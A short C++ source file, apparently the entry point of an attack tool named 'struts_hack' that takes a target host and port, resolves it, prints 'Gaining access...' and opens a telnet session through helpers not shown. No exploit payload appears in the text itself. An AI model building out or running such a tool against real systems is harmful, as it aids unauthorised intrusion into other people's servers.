#include "hdr.h"

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "Usage:" << endl << "struts_hack [target] [port]" << endl;
        return 1;
    }

    addrinfo* addr = findHost(argv[1], argv[2]);

    if (addr == NULL) {
        return 1;
    }

    cout << "Gaining access..." << endl;
    telnet(addr, argv[1]);

    return 1;
}